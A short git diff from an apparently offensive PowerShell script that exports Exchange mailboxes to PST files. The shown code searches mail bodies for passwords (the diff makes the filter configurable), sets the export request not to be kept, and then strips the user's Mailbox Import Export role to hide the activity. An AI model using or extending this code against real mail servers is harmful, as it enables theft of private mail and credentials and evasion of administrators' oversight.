@@ -69,7 +69,7 @@ PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "Do
     }
     Write-Host "[+] Start to export mail" 
     #Export mail and do not save the export request
-    New-MailboxexportRequest -mailbox $MailBox -ContentFilter {(body -like "*pass*")} -FilePath ($ExportPath+$MailBox+".pst") -CompletedRequestAgeLimit 0
+    New-MailboxexportRequest -mailbox $MailBox -ContentFilter $Filter -FilePath ($ExportPath+$MailBox+".pst") -CompletedRequestAgeLimit 0
     Write-Host "[>] Start to remove user"
     #Remove user
     Get-ManagementRoleAssignment ("Mailbox Import Export-"+$User) |Remove-ManagementRoleAssignment -Confirm:$false
